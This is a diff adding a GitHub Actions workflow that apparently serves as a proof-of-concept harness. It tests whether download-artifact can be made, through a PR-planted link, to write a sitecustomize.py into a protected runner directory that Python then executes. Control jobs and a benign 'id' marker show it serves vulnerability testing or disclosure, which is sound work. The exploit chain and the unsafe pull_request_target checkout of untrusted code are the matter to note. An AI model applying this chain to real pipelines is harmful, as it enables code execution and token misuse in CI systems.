@@ -1,0 +1,154 @@
+name: download artifact critical boundary
+on:
+  pull_request_target:
+    types: [opened]
+permissions:
+  contents: read
+  statuses: write
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Checkout lower data only
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+          path: lower-data
+          persist-credentials: false
+          allow-unsafe-pr-checkout: true
+      - name: Upload lower candidate strictly as artifact data
+        uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f
+        with:
+          name: candidate
+          path: lower-data/candidate-artifact
+          if-no-files-found: error
+      - name: Upload noncolliding control artifact
+        uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f
+        with:
+          name: safe
+          path: lower-data/safe-artifact
+          if-no-files-found: error
+  candidate:
+    needs: produce
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Prepare empty protected startup directory
+        run: mkdir -p "$RUNNER_TEMP/artifact-rce-6c8d3b834ab2ef881bdec5a7"
+      - name: Checkout lower data only
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+          path: lower-data
+          persist-credentials: false
+          allow-unsafe-pr-checkout: true
+      - name: Download candidate through current v8
+        id: download
+        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333
+        with:
+          name: candidate
+          path: lower-data
+      - name: Trigger normal trusted Python startup
+        id: trigger
+        env:
+          PYTHONPATH: ${{ runner.temp }}/artifact-rce-6c8d3b834ab2ef881bdec5a7
+        run: python3 -c 'pass'
+      - name: Verify exact benign command effect and post protected status
+        if: always()
+        env:
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          STATUS_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          DOWNLOAD_OUTCOME: ${{ steps.download.outcome }}
+          TRIGGER_OUTCOME: ${{ steps.trigger.outcome }}
+        run: |
+          python3 - <<'PY'
+          import hashlib,http.client,json,os,pathlib,re,sys
+          target=pathlib.Path(os.environ['RUNNER_TEMP'])/'artifact-rce-6c8d3b834ab2ef881bdec5a7'/'id-result.txt'
+          module=pathlib.Path(os.environ['RUNNER_TEMP'])/'artifact-rce-6c8d3b834ab2ef881bdec5a7'/'sitecustomize.py'
+          raw=target.read_bytes() if target.is_file() else b''
+          effect=bool(re.match(rb'^uid=[0-9]+\([^\r\n]+\) gid=[0-9]+\([^\r\n]+\)',raw))
+          result={'case':'candidate','download_outcome':os.environ.get('DOWNLOAD_OUTCOME'),'trigger_outcome':os.environ.get('TRIGGER_OUTCOME'),'outside_module_present':module.is_file(),'benign_id_effect':effect,'effect_bytes':len(raw),'effect_sha256':hashlib.sha256(raw).hexdigest()}
+          state='success' if effect else 'failure'
+          body=json.dumps({'state':state,'context':'artifact-critical-rce','description':'benign id command '+('executed' if effect else 'blocked')})
+          conn=http.client.HTTPSConnection('api.github.com',timeout=30)
+          conn.request('POST',f"/repos/{os.environ['GITHUB_REPOSITORY']}/statuses/{os.environ['HEAD_SHA']}",body=body,headers={'Authorization':'Bearer '+os.environ['STATUS_TOKEN'],'Accept':'application/vnd.github+json','Content-Type':'application/json','User-Agent':'artifact-critical-independent'})
+          response=conn.getresponse();response.read();request_id=response.getheader('x-github-request-id');conn.close()
+          result['status']={'http':response.status,'state':state,'request_id_sha256':hashlib.sha256(str(request_id).encode()).hexdigest()}
+          print('ARTIFACT_CRITICAL_RESULT='+json.dumps(result,sort_keys=True,separators=(',',':')))
+          sys.exit(0 if effect and response.status==201 else 1)
+          PY
+  no_link_control:
+    needs: produce
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Prepare empty protected control directory
+        run: mkdir -p "$RUNNER_TEMP/artifact-rce-6c8d3b834ab2ef881bdec5a7-no-link"
+      - name: Checkout lower data only
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+          path: lower-data
+          persist-credentials: false
+          allow-unsafe-pr-checkout: true
+      - name: Replace lower link with ordinary contained directory
+        run: |
+          unlink lower-data/landing
+          mkdir lower-data/landing
+      - name: Download identical candidate without the link
+        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333
+        with:
+          name: candidate
+          path: lower-data
+      - name: Trigger trusted Python against untouched control directory
+        env:
+          PYTHONPATH: ${{ runner.temp }}/artifact-rce-6c8d3b834ab2ef881bdec5a7-no-link
+        run: python3 -c 'pass'
+      - name: Verify no command effect
+        run: |
+          python3 - <<'PY'
+          import hashlib,json,os,pathlib,sys
+          root=pathlib.Path(os.environ['RUNNER_TEMP'])/'artifact-rce-6c8d3b834ab2ef881bdec5a7-no-link'
+          target=root/'id-result.txt';raw=target.read_bytes() if target.is_file() else b''
+          result={'case':'no-link','benign_id_effect':bool(raw),'outside_module_present':(root/'sitecustomize.py').is_file(),'effect_sha256':hashlib.sha256(raw).hexdigest(),'effect_bytes':len(raw)}
+          print('ARTIFACT_CRITICAL_RESULT='+json.dumps(result,sort_keys=True,separators=(',',':')))
+          sys.exit(0 if not raw and not (root/'sitecustomize.py').exists() else 1)
+          PY
+  safe_member_control:
+    needs: produce
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Prepare empty protected control directory
+        run: mkdir -p "$RUNNER_TEMP/artifact-rce-6c8d3b834ab2ef881bdec5a7"
+      - name: Checkout lower data only
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+          path: lower-data
+          persist-credentials: false
+          allow-unsafe-pr-checkout: true
+      - name: Download safe noncolliding member with the link present
+        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333
+        with:
+          name: safe
+          path: lower-data
+      - name: Trigger trusted Python against protected directory
+        env:
+          PYTHONPATH: ${{ runner.temp }}/artifact-rce-6c8d3b834ab2ef881bdec5a7
+        run: python3 -c 'pass'
+      - name: Verify no command effect
+        run: |
+          python3 - <<'PY'
+          import hashlib,json,os,pathlib,sys
+          root=pathlib.Path(os.environ['RUNNER_TEMP'])/'artifact-rce-6c8d3b834ab2ef881bdec5a7'
+          target=root/'id-result.txt';raw=target.read_bytes() if target.is_file() else b''
+          result={'case':'safe-member','benign_id_effect':bool(raw),'outside_module_present':(root/'sitecustomize.py').is_file(),'effect_sha256':hashlib.sha256(raw).hexdigest(),'effect_bytes':len(raw)}
+          print('ARTIFACT_CRITICAL_RESULT='+json.dumps(result,sort_keys=True,separators=(',',':')))
+          sys.exit(0 if not raw and not (root/'sitecustomize.py').exists() else 1)
+          PY
